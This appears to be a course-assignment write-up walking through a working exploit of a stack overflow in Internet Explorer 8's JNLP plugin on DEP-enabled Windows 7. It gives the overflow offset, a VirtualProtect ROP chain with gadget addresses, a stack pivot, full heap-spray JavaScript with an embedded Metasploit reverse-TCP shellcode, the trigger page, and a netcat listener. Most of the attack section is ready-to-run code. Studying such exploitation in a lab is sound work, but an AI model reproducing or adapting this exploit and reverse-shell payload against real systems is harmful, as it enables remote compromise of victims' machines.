# Exploiting a Buffer Overflow Vulnerability in the JNLP plugin within Internet Explorer 8 with using the Heap Spraying Technique in a DEP-Enabled (Data Execution Prevention) Windows 7 Machine

JNLP (Java Network Launch Protocol) enables an application to be launched on a client desktop using resources that are hosted on a remote server. A specific version of JNLP for IE8 is vulnerable to a stack-based buffer overflow: when the plugin is invoked with a **launchjnlp** parameter, it will copy the value of the **docbase** parameter to a stack buffer using `sprintf`, but fails to check the length of the value. 

The vulnerability can be triggered by the following:
```html
<object type='application/x-java-applet'>
<param name='launchjnlp' value='1'>
<param name='docbase' value='AAAAAAAA....AAAAAA'>
</object>
```

## Goal
Input a sufficiently long string in the **docbase** value such that we have control of the program by overwriting $ebp and $eip to run a shellcode that establishes a reverse TCP connection to another machine.


## How it's done
To demonstrate this vulnerability, a simple web server is set up to listen on port 8080. This web server shows the contents of a specific directory in which the html file (containing the exploit) is located. The html file is clicked from the client and nothing appears to happen, but the truth is that the heap is sprayed with a shellcode! This shellcode's goal is to establish a reversed TCP connection to a chosen IP and port. The port used is *6666*, and to simplifly the assignment's grading, the chosen IP is 127.0.0.1, which means that the command prompt is obtained in the client instead of in the attacker's machine (Ubuntu Linux, in this case).

Ideally, when the victim clicks on  **Click Me**, the shellcode should be executed. However, the big obstacle preventing this is called DEP. DEP is a system-level memory protection feature that is built into the operating system; it marks memory regions as non-executable, and therefore, it prevents the execution of code from data pages such as the heap, stacks, and memory pools.

To go around this, we are going to call Virtual Protect. VirtualProtect is a kernel32.dll function that can be used to change the execution permissions of a page. We can specify the pointer to the memory address that we want to mark as executable. To be able to call it, we need to use the principles of Return Oriented Programming (or ROP). Since there is a buffer overflow vulnerability in the JNLP invocation, we can set/overwrite whatever values we want on $ebp and $eip, thus, controling the execution of the program with the goal of calling VirtualProtect.


## Specific Steps
0. Two machines are used to demonstrate this vulnerability. A Windows 7 VM acts as the client, and an Ubuntu Linux VM acts as the web server.

1. Test different length inputs for **docbase** to determine the number of bytes needed to override $ebp and $eip. In this case, 388 bytes is the maximum amount of bytes that can be placed on the buffer before starting to overwrite $ebp and $eip. 

2. A Windows shellcode is generated with Metasploit, which is a tool already installed in Kali Linux. The instructions in this shellcode create a reverse TCP connection from said Windows machine to a chosen IP and port. In other words, these instructions would spawn the victim's command prompt in the attacker's machine; but for practicality, the IP chosen as the attacker's IP does not belong to the attacker and it is the victim's machine, 127.0.0.1. Using the attacker's IP would make the demo realistic, but it would not make it easy to the grader of this assignment.

The shellcode is generated as follows:

`msfconsole`

`use payload/windows/shell_reverse_tcp`

`set LHOST 127.0.0.1`

`set LPORT 6666`

`generate -t js_le`

In the last command, **js_le** was used because a JavaScript shellcode is needed and the Windows machine that is targeted uses Little Endian (le).

3. To insert a call to VirtualProtect, we need to chain the necessary frames with gadgets from a library that is not compatible with ASLR.
To determine which libraries are not compatible with ASLR, I ran `!load narly` and `!nmod` in WinDBG. I confirmed that msvcr71.dll was a good candidate, so I downloaded it and used Skyrack to find the primitive operations (gadgets) addresses that I was interested in. These gadgets will exist in said addresses in every execution of the program because they are not affected by ASLR.

*Note that the shellcode address used in this block can only be determined after step #5 and #6. I was using 0x41414141 for testing purposes until I found a realiable address for my shellcode.*
```
%u4242%u4242 Any bytes                        (0x42424242) *
%u4cc1%u7c34 pop eax; ret                     (0x7C344cc1)
%ua158%u7c37 Virtual Protect Stub             (0x7C37A158)
%u64bf%u7c35 call dword ptr [eax-18h] ; ret   (0x7C3564BF)
%u2208%u0808 parameter 1: Shellcode Address   (0x08082208)
%u4000%u0000 parameter 2: Size of region      (0x00004000)
%u0040%u0000 parameter 3: Protection Bits RWX (0x00000040)
%u0a0a%u0a0a parameter 4: Old protection value(0x0a0a0a0a) [Or any writable]
%u2208%u0808 Shellcode Address                (0x08082208) **

* Due to the Standard calling convention, after “ret,” ESP register does not directly 
point to the next word of Saved EIP.
The callee function cleans local variable; thus ESP will point to right after the function 
parameters on the stack. Which is why we can use any bytes as the beggining of the ROP chain.

** Return from previos gadget (as its page is executable, shellcode will proceed to run)
```

The final ROP chain looks as follows:
```%u4242%u4242%u4cc1%u7c34%ua158%u7c37%u64bf%u7c35%u2208%u0808%u0040%u0000%u4000%u0000%u0a0a%u0a0a%u2208%u0808```

Now, the problem with these ROP chain is that it contains null bytes and the program crashes when it is running the gadgets.
For this problem, we use another technique called "Stack pivot" or "Stack flip". That is, we set $esp to point to a heap region which has been sprayed with the ROP chain.

4. Stack Pivot/Flip:

To set $esp to point to our ROP chain, we can use the gadget `leave; ret`, which consists of the following instructions:

* LEAVE = MOV ESP, EBP; POP EBP
* RET = POP EIP

Because we have control of $ebp due to the buffer overflow, we can place the address of the ROP frames on it, as it will later be copied to $esp (MOV ESP, EBP)

The address of this gadget is 0x7c3411a4. 

5. Heap Spraying:
Because we have to pieces of code that we want to spray on the heap, I decided to concatenate both; the ROP chain followed by the shellcode.

To spray the heap with the shellcode, an array **a** is initialized and a function **heap_spray()** is specified to populate **a**

Notice that the first chunk of bytes in the shellcode variable corresponds to the ROP chain created in step #3 and the rest corresponds to the shellcode generated in step #2.

We want to have predictable addresses for both of these pieces of code. This is called "Targeted Heap Spray," and this [article](http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html?m=1) does a great job explaining how it can be done. 
```javascript
   function heap_spray() {

      var shellcode = unescape("%u4242%u4242%u4cc1%u7c34%ua158%u7c37%u64bf%u7c35%u2208%u0808%u4000%u0000%u0040%u0000%u0a0a%u0a0a%u2208%u0808%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u1a00%u890a%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff")
      
      while(shellcode.length <= 100000) {
         shellcode += shellcode;
      }

      var a_megabyte = shellcode.substr(0, (1024*64)/2);

      for(i = 0; i<14; i++) {
          a_megabyte += shellcode.substr(0, (1024*64)/2);
      }

      a_megabyte += shellcode.substr(0, (1024*64/2)-(38/2));

      for(i = 0; i < 100; i++){
        a[i] = a_megabyte.substr(0, a_megabyte.length);
      }
   }
```
The bytes are passed to the function **unescape()** to let javascript know that the string is already represented in hex. 


6. Loading our html page that contains an executes **heap_spray()** and attaching the IE tab with WinDBG, we can search for specific bytes that we know are present in the shellcode. 
Executing `s 0x00000000 L?0x7FFFFFFF fc e8 82 00` and `s 0x00000000 L?0x7FFFFFFF 42 42 42 42` in WinDBG is useful to get both the address of the ROP chain and the address of the shellcode.

I chose 0x08082208 as the address of the shellcode and 0x08080ccc as the address of the ROP chain. Because of step #4, the address of `ret; leave` should be placed on the right place to overwrite $ebp, and the address of the ROP chain should be placed on $eip.

As follows:
```html
   .
   .
   function trigger() {
      var buf = "";
      for(i = 0; i < 388; i++){
          buf += "\x41";
      }
      buf += "\xcc\x0c\x08\x08"; // ebp : make it the beggining of rop frames
      buf += "\xa4\x11\x34\x7c"; // eip : ret; leave

      var htmlTags =
         "<object type='application/x-java-applet'>" +
         "<param name='launchjnlp' value='1'>" +
         "<param name='docbase' value='" + buf + "'>" +
         "</object>";

      document.write(htmlTags);
   }
   </script>
</head>
<body onload="heap_spray()">
   <input type="button" value="Click Me" onclick="trigger()">
</body>
</html>
```

This means that as soon as the victim clicks on the page (jnlp1.html), the heap should be sprayed because of `<body onload="heap_spray">`.

So when **Click Me** is clicked, **trigger()** will begin the execution of the exploit.

7. And to accept this reverse TCP connection in Windows (and confirm that the exploit was successful), the following netcat command is needed:

`nc -l -p 6666`

**-l** specifies that nc should listen for an incoming connection, and **-p** specifies the source port.


